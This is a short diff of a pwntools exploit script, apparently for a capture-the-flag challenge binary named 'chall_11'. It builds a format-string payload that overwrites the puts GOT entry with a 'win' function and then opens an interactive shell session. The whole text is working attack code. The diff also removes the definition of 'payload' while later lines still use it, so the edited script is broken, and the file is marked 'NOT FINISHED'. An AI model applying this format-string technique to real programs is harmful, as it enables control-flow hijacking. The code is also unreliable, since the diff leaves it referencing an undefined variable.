@@ -1,16 +1,10 @@
 from pwn import *
 binary = context.binary = ELF('./chall_11')
-
-p = process('./chall_11')
-p.recv()
-
+p = process(binary.path)
 offset = 11
-payload = fmtstr_payload(offset,{binary.sym.puts:binary.sym.win})
-p.sendline(payload)
-
+p.sendline(fmtstr_payload(offset,{binary.sym.puts:binary.sym.win}))
 null = payload.find(b'\x00')
 p.recvuntil(payload[null-3:null])
-
 p.interactive()
 
 # NOT FINISHED
